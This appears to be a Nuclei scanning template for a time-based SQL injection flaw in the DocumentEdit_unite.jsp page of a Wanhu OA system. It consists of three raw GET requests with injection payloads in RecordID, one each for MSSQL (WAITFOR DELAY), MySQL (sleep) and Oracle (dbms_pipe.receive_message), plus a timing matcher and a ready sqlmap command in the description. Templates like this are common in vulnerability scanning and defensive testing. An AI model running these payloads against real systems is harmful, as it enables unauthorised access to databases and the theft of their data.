id: wanhuoa-DocumentEdit-unite-sqli
info:
  name: wanhuoa-DocumentEdit-unite-sqli
  author: apple
  severity: high
  description: 使用sqlmap -u http://x/defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1 --level 3 --thread 5 --batch
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |+
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1'%20WAITFOR%20DELAY%20'0:0:5'--%20LTLq HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

      - |+
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1'+and%2bsleep(5)%2b--%252b HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

      - |+
        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1'+and+1%3ddbms_pipe.receive_message('RDS',+5)-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Connection: close
        Upgrade-Insecure-Requests: 1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and